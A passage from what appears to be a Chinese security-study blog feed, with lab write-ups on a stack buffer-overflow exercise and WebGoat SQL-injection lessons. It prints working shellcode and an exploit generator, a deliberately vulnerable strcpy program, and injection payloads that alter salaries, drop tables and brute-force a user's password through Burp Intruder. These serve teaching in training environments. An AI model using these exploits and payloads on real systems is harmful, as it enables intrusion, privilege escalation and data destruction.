class="headerlink" title="main call bof后，bof call strpy后，且strcpy返回后："></a>main call bof后，bof call strpy后，且strcpy返回后：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732962431.png" alt="uTools_1649732962431"></p><h6 id="bof-return-后（没有返回main而是被定位到了恶意代码位置0xffff1d76）："><a href="#bof-return-后（没有返回main而是被定位到了恶意代码位置0xffff1d76）：" class="headerlink" title="bof return 后（没有返回main而是被定位到了恶意代码位置0xffff1d76）："></a>bof return 后（没有返回main而是被定位到了恶意代码位置0xffff1d76）：</h6><p>在此之后，程序从0xffff1d76开始向高地址方向当作代码进行执行，最终执行到恶意代码</p><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732973365.png" alt="uTools_1649732973365"></p><h5 id="如果正常运行，应该经历的阶段"><a href="#如果正常运行，应该经历的阶段" class="headerlink" title="如果正常运行，应该经历的阶段"></a>如果正常运行，应该经历的阶段</h5><ul><li>由于buffer overflow的原因，下面本该正常出现的状态最后没有发生，我还是选择将这些状态记录在下面。</li></ul><h6 id="（由于buffer-overflow，实际未发生）main-call-bof后，bof-leave后ret前："><a href="#（由于buffer-overflow，实际未发生）main-call-bof后，bof-leave后ret前：" class="headerlink" title="（由于buffer overflow，实际未发生）main call bof后，bof leave后ret前："></a>（由于buffer overflow，实际未发生）main call bof后，bof leave后ret前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695859172-16497336117857.png" alt="uTools_1649695859172"></p><h6 id="（由于buffer-overflow实际未发生）bof-ret后："><a href="#（由于buffer-overflow实际未发生）bof-ret后：" class="headerlink" title="（由于buffer overflow实际未发生）bof ret后："></a>（由于buffer overflow实际未发生）bof ret后：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695866837-16497336117858.png" alt="uTools_1649695866837"></p><h5 id="附：实验所用程序集合"><a href="#附：实验所用程序集合" class="headerlink" title="附：实验所用程序集合"></a>附：实验所用程序集合</h5><ol><li>exploit.c 生成可以利用缓冲区漏洞进行攻击的badfile文件</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* exploit.c */</span></span><br><span class="line"><span class="comment">/* A program that creates a file &quot;badfile&quot; containing code for launching shell */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 400 <span class="comment">// Represent the offset from buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode[]数组中存储了我们利用buffer overflow漏洞想要执行的恶意代码</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line">  <span class="string">&quot;\x31\xc0&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe3&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe1&quot;</span></span><br><span class="line">  <span class="string">&quot;\x99&quot;</span></span><br><span class="line">  <span class="string">&quot;\xb0\x0b&quot;</span></span><br><span class="line">  <span class="string">&quot;\xcd\x80&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//fillBuffer函数将shellcode[]数组中的恶意代码放在了函数fillBuffer的最后</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fillBuffer</span><span class="params">(<span class="keyword">char</span> buffer[BUFFER_SIZE])</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Get the size of the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeSize = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent an estimate return address that will eventually allow shellcode to be executed</span></span><br><span class="line">  <span class="comment">// by using the address of the buffer and an offset value (400 bytes after the buffer in this case)</span></span><br><span class="line">  <span class="keyword">long</span> *returnAddress = (<span class="keyword">long</span> *) (buffer+OFFSET);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get a long integer pointer of the buffer to reference each 4-bytes hexadecimal in a stack memory address</span></span><br><span class="line">  <span class="keyword">long</span> *bufferPtr = (<span class="keyword">long</span> *) buffer;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent index for the &quot;for&quot; loop</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get the starting index of the null-terminated shellcode in the buffer</span></span><br><span class="line">  <span class="comment">// (i.e. null-terminated shellcode is inserted at the end of the buffer)</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeStartIndex = (BUFFER_SIZE-(shellcodeSize+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent counter for the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Loop 25 times (each time modifying the 4-bytes hexadecimal in the stack memory address starting from the buffer)</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">    *bufferPtr = (<span class="keyword">long</span>) returnAddress; <span class="comment">// Assign the estimate return address to a 4-bytes hexadecimal in the stack memory address</span></span><br><span class="line">    bufferPtr++; <span class="comment">// Go to the next 4-bytes hexadecimal in the stack memory address (because long integer is 4-bytes portion)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Insert shellcode (without null-termination) at the end of the buffer</span></span><br><span class="line">  <span class="keyword">for</span> (i = shellcodeStartIndex; i &lt; (BUFFER_SIZE<span class="number">-1</span>); i++) &#123;</span><br><span class="line">    buffer[i] = shellcode[shellcodeCounter];</span><br><span class="line">    shellcodeCounter++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Null-terminate the shellcode</span></span><br><span class="line">  buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">  FILE *badfile;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize buffer with 0x90 (NOP instruction) */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0x90</span>, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* You need to fill the buffer with appropriate contents here */</span></span><br><span class="line">  fillBuffer(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Save the contents to the file &quot;badfile&quot; */</span></span><br><span class="line">  badfile = fopen(<span class="string">&quot;./badfile&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(buffer, BUFFER_SIZE, <span class="number">1</span>, badfile);</span><br><span class="line">  fclose(badfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>stack.c 有漏洞的C语言文件</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stack.c */</span></span><br><span class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></span><br><span class="line"><span class="comment">/* Our task is to exploit this vulnerability */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bof</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">24</span>];</span><br><span class="line"><span class="comment">//printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//printf(&quot;str addr (%p)\n&quot;, str);</span></span><br><span class="line">    FILE *badfile;</span><br><span class="line">    badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>setuid.c 利用漏洞开shell的示例文件</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Buffer Overflow Attack ，part2：模拟实验&lt;/p&gt;</summary>
    
    
    
    
    <category term="Buffer Overflow Attack" scheme="http://example.com/tags/Buffer-Overflow-Attack/"/>
    
    <category term="C语言" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat  (A1)Injection SQL Injection(intro) 和 SQL Injection(advanced)</title>
    <link href="http://example.com/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/"/>
    <id>http://example.com/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/</id>
    <published>2022-04-06T14:03:11.000Z</published>
    <updated>2022-04-06T14:05:39.961Z</updated>
    
    <content type="html"><![CDATA[<p>WebGoat 安全学习计划 Part 2</p><span id="more"></span><h1 id="WebGoat-A1-Injection-SQL-Injection-intro-和-SQL-Injection-advanced"><a href="#WebGoat-A1-Injection-SQL-Injection-intro-和-SQL-Injection-advanced" class="headerlink" title="WebGoat  (A1)Injection SQL Injection(intro) 和 SQL Injection(advanced)"></a>WebGoat  (A1)Injection SQL Injection(intro) 和 SQL Injection(advanced)</h1><h2 id="SQL-Injection-1-intro"><a href="#SQL-Injection-1-intro" class="headerlink" title="SQL Injection (1: intro)"></a>SQL Injection (1: intro)</h2><p>顺手复习一下SQL语句</p><h4 id="2-What-is-SQL"><a href="#2-What-is-SQL" class="headerlink" title="2.What is SQL?"></a>2.What is SQL?</h4><p>SELECT department FROM employees where first_name=’Bob’ and last_name=’Franco’</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649235870043.png" alt="uTools_1649235870043"></p><h4 id="3-Data-Manipulation-Language-DML"><a href="#3-Data-Manipulation-Language-DML" class="headerlink" title="3.Data Manipulation Language (DML)"></a>3.Data Manipulation Language (DML)</h4><ul><li>DML 命令用于存储、检索、修改和删除数据。</li><li>SELECT - 从数据库中检索数据</li><li>INSERT - 将数据插入数据库</li><li>UPDATE - 更新数据库中的现有数据</li><li>DELETE - 从数据库中删除记录</li></ul><p>UPDATE employees SET department = ‘Sales’ WHERE first_name=’Tobi’ AND last_name = ‘Barnett’</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649236171611.png" alt="uTools_1649236171611"></p><h4 id="4-Data-Definition-Language-DDL"><a href="#4-Data-Definition-Language-DDL" class="headerlink" title="4.Data Definition Language (DDL)"></a>4.Data Definition Language (DDL)</h4><ul><li>DDL 命令用于创建、修改和删除数据库对象的结构。</li><li>CREATE - 创建数据库对象，例如表和视图</li><li>ALTER - 改变现有数据库的结构</li><li>DROP - 从数据库中删除对象</li></ul><p>ALTER TABLE employees ADD phone varchar(20)</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649236292236.png" alt="uTools_1649236292236"></p><h4 id="5-Data-Control-Language-DCL"><a href="#5-Data-Control-Language-DCL" class="headerlink" title="5.Data Control Language (DCL)"></a>5.Data Control Language (DCL)</h4><ul><li>DCL 命令用于实现对数据库对象的访问控制。</li><li>GRANT - 授予用户对数据库对象的访问权限</li><li>REVOKE - 撤销之前使用 GRANT 授予的用户权限</li></ul><p>GRANT ALL ON grant_rights TO unauthorized_user</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649236699191.png" alt="uTools_1649236699191"></p><h4 id="9-Try-It-String-SQL-injection"><a href="#9-Try-It-String-SQL-injection" class="headerlink" title="9.Try It! String SQL injection"></a>9.Try It! String SQL injection</h4><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649239224072.png" alt="uTools_1649239224072"></p><h4 id="10-Try-It-Numeric-SQL-injection"><a href="#10-Try-It-Numeric-SQL-injection" class="headerlink" title="10.Try It! Numeric SQL injection"></a>10.Try It! Numeric SQL injection</h4><p>这个题目有问题的肯定是第二个字段</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649239433208.png" alt="uTools_1649239433208"></p><h4 id="11-Compromising-confidentiality-with-String-SQL-injection"><a href="#11-Compromising-confidentiality-with-String-SQL-injection" class="headerlink" title="11.Compromising confidentiality with String SQL injection"></a>11.Compromising confidentiality with String SQL injection</h4><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649239633872.png" alt="uTools_1649239633872"></p><h4 id="12-Compromising-Integrity-with-Query-chaining"><a href="#12-Compromising-Integrity-with-Query-chaining" class="headerlink" title="12.Compromising Integrity with Query chaining"></a>12.Compromising Integrity with Query chaining</h4><p>把自己的salary改成10000：</p><p>3SL99A’ ; UPDATE employees SET SALARY=100000 WHERE AUTH_TAN = ‘3SL99A’ AND ‘1’=’1</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649240502420.png" alt="uTools_1649240502420"></p><h4 id="13-Compromising-Availability"><a href="#13-Compromising-Availability" class="headerlink" title="13.Compromising Availability"></a>13.Compromising Availability</h4><p>‘ ; DROP TABLE access_log; —</p><ol><li>结束上一句</li><li>执行drop table命令</li><li>注释掉后面的内容(即最后一个 ‘ )</li></ol><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649240914911.png" alt="uTools_1649240914911"></p><p>完成展示：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649241017450.png" alt="uTools_1649241017450"></p><h2 id="SQL-Injection-2-advanced"><a href="#SQL-Injection-2-advanced" class="headerlink" title="SQL Injection (2: advanced)"></a>SQL Injection (2: advanced)</h2><h4 id="3-Try-It-Pulling-data-from-other-tables"><a href="#3-Try-It-Pulling-data-from-other-tables" class="headerlink" title="3.Try It! Pulling data from other tables"></a>3.Try It! Pulling data from other tables</h4><p><strong>Name: </strong>‘; SELECT * FROM user_system_data; — </p><p>1’ OR TRUE UNION SELECT * FROM user_system_data; — (这句为啥没成？？)</p><p><strong>Password:</strong> passW0rD</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649245652747.png" alt="uTools_1649245652747"></p><h4 id="5-实战目标：你能以汤姆的身份登录吗？"><a href="#5-实战目标：你能以汤姆的身份登录吗？" class="headerlink" title="5. 实战目标：你能以汤姆的身份登录吗？"></a>5. 实战目标：你能以汤姆的身份登录吗？</h4><p>提示一览：</p><ul><li><p>查看您从服务器收到的不同响应</p></li><li><p>漏洞在注册表单上</p></li><li><p>使用工具自动执行此攻击</p></li><li><p>表名在 WebGoat 每次启动时都是随机的，请先尝试找出名称。</p></li><li><p>查找易受 SQL 注入攻击的字段，使用该字段更改密码。</p></li><li><p>通过 UPDATE 语句更改密码。</p></li><li><p>易受攻击的字段是注册表单的用户名字段。</p></li><li><p>查看您从服务器收到的不同响应</p></li><li><p>漏洞在注册表单上</p></li><li><p>使用工具自动执行此攻击</p></li></ul><p>先观察这个login，尝试在里面填东西（类似于1’ or ‘1’=’1），然后点login，看看能不能出现有价值的信息，</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649247289112.png" alt="uTools_1649247289112"></p><p>注意到这个No results matched, try again. 这说明这个表单背后的代码的检查机制不是我们想象中的方式，找不到合适的机会利用它。</p><p>转换思路，看看那个REGISTER是怎么个情况</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649247998516.png" alt="uTools_1649247998516"></p><p>出现了我们想要的东西：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649248020384.png" alt="uTools_1649248020384"></p><p>这个很显然就是后台会进行检查：select * from table where username=’   ‘ 这么一个类似语句用来检查这个用户名是否已经被注册过了。</p><p>再试一个错了的2’ and ‘1’=’2</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649248438716.png" alt="uTools_1649248438716"></p><p>可以看到这个时候应该是系统没有找到对应的结果，于是create了一个新用户，也符合我们的预期。</p><p>突破口GET！！！下一步？？</p><p>我们先看看这些表单发包的格式：</p><p>发送包：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649249147657.png" alt="uTools_1649249147657"></p><p>返回包：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649249159314.png" alt="uTools_1649249159314"></p><p>再发，返回的信息不同了</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649249196250.png" alt="uTools_1649249196250"></p><p>之前提示已有：用 tom’ AND substring(password,1,1) = ‘a</p><p>这个句子可以判断我们的password的第一个字符是不是a，那么我们遍历所有可能字符不就能破译密码了吗！！</p><p><strong>接下来我们用burp suite进行爆破攻击：</strong></p><p>攻击语句：tom’+AND+substring(password%2C+1%2C+1)+%3D+’§pass_char§</p><p>右键把这个request先send到intruder</p><p><strong>手把手教你用intruder！！！</strong></p><p>刚进去时设置了很多可遍历变量，我们点clear都删掉</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649249990431.png" alt="uTools_1649249990431"></p><p>之后只给我们需要的 pass_char 部分ADD一个变量标上去</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649250043311.png" alt="uTools_1649250043311"></p><p>接下来我们点payloads页面，将payload type改成 Brute forcer，min length和max length设为1</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649250256761.png" alt="uTools_1649250256761"></p><p>点击start attack</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649250983086.png" alt="uTools_1649250983086"></p><p>发现运行结果居然不理想？？有很多status是500的包，而且每次运行，出现这种情况的字符还都不一样？？？</p><p>这种我们可以推测是因为发包的速度太快了，我们的服务器吃不消，或者丢包什么的，我们来改一下intruder速度试一试，修改如下：</p><p>点dashboard，上面一栏tasks右边的小齿轮</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649251588771.png" alt="uTools_1649251588771"></p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649251609523.png" alt="uTools_1649251609523"></p><p>可以看到我们现在用的这个default resource pool，并行10条线程，延时500兆秒，确实有点离谱了。点击new新建一个新的pool：new_pool,改设置如下（后来改delay为200了，这个有点慢了）：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649251748123.png" alt="uTools_1649251748123"></p><p>点OK，之后再回到intruder页，点resource pool栏，选择刚建的pool进行攻击</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649251926560.png" alt="uTools_1649251926560"></p><p>这个时候，终于我们的结果都是status=200了！！！</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649252026513.png" alt="uTools_1649252026513"></p><p>我们稍改一波语句，重新进行我们的测试，结果如下：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649252246021.png" alt="uTools_1649252246021"></p><p>一堆420里面跑出来一个406，一看response，发现这个提示是”already exists”，说明这个字符t就是tom密码的第一个字符。</p><p>可以去<a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/analyzing-results查看官方给的intruder使用详解">https://portswigger.net/burp/documentation/desktop/tools/intruder/analyzing-results查看官方给的intruder使用详解</a></p><p>这里我们不想在一堆420里大海捞针406，我们可以选择filter：点上面的Filter栏，选Regex，随便粘点我们需要的response里面独有的话，点apply。这时我们的结果里面就只剩下我们想要的这一项了。</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649252771172.png" alt="uTools_1649252771172"></p><p>tom’+AND+substring(password%2C+<strong>num</strong>%2C+1)+%3D+’§pass_char§</p><p>依次把这个num从1一路加到23，记录每个结果，然后我们就爆破出了tom的密码：thisisasecretfortomonly</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649253179452.png" alt="uTools_1649253179452"></p><p>终于，Congratulations！！！！</p><p>完成结果：</p><p><img src="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/uTools_1649253220103.png" alt="uTools_1649253220103"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;WebGoat 安全学习计划 Part 2&lt;/p&gt;</summary>
    
    
    
    
    <category term="WebGoat" scheme="http://example.com/tags/WebGoat/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Buffer Overflow Attack ，part1：基本原理</title>
    <link href="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</id>
    <published>2022-04-06T08:19:18.000Z</published>
    <updated>2022-04-06T08:21:06.883Z</updated>
    
